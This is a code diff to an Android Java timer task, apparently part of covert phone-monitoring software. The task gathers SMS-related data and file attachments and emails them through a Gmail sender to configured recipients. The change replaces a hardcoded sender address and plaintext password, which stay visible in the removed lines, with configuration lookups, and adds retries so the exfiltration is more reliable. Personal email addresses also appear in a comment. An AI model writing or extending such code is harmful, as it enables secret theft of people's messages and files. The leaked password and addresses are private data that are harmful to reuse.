@@ -29,6 +29,7 @@ import com.system.feature.sms.SmsInfo;
 import com.system.utils.*;
 import com.system.utils.mail.GMailSender;
 import com.system.utils.mail.GMailSenderEx;
+import com.system.utils.mail.MailCfg;
 
 import android.app.Activity;
 import android.app.Service;
@@ -97,9 +98,16 @@ public class GetInfoTask extends TimerTask
 			fileList.add(attachments.get(i).getAbsolutePath());
 		
 		String[] recipients = getRecipients(service);//{"richardroky@gmail.com", "ylssww@126.com"};
-		boolean result = sendMail(subject, body, 
-				"richardroky@gmail.com", "yel510641",
-				recipients, fileList);
+		String pwd = MailCfg.getSenderPwd(service);
+		
+		boolean result = false;
+		int retry = 3;
+		while(!result && retry > 0)
+		{
+			String sender = MailCfg.getSender(service);
+			result = sendMail(subject, body, sender, pwd, recipients, fileList);
+			if (!result) retry--;
+		}
 		attachments.clear();
 			
 		// Update the last date time
